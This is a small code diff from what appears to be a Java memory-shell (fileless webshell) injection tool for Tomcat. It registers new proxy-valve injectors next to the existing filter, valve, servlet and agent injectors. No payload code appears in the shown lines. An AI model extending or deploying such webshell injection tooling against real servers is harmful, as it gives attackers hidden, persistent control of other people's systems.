@@ -3,7 +3,6 @@ package com.reajason.javaweb.memshell.server;
 import com.reajason.javaweb.memshell.injector.tomcat.*;
 import com.reajason.javaweb.memshell.utils.ShellCommonUtil;
 import net.bytebuddy.asm.Advice;
-import net.bytebuddy.implementation.bytecode.assign.Assigner;
 
 import static com.reajason.javaweb.memshell.ShellType.*;
 
@@ -39,6 +38,8 @@ public class TomcatShell extends AbstractShell {
                 .addInjector(JAKARTA_FILTER, TomcatFilterInjector.class)
                 .addInjector(VALVE, TomcatValveInjector.class)
                 .addInjector(JAKARTA_VALVE, TomcatValveInjector.class)
+                .addInjector(PROXY_VALVE, TomcatProxyValveInjector.class)
+                .addInjector(JAKARTA_PROXY_VALVE, TomcatProxyValveInjector.class)
                 .addInjector(SERVLET, TomcatServletInjector.class)
                 .addInjector(JAKARTA_SERVLET, TomcatServletInjector.class)
                 .addInjector(AGENT_FILTER_CHAIN, TomcatFilterChainAgentInjector.class)
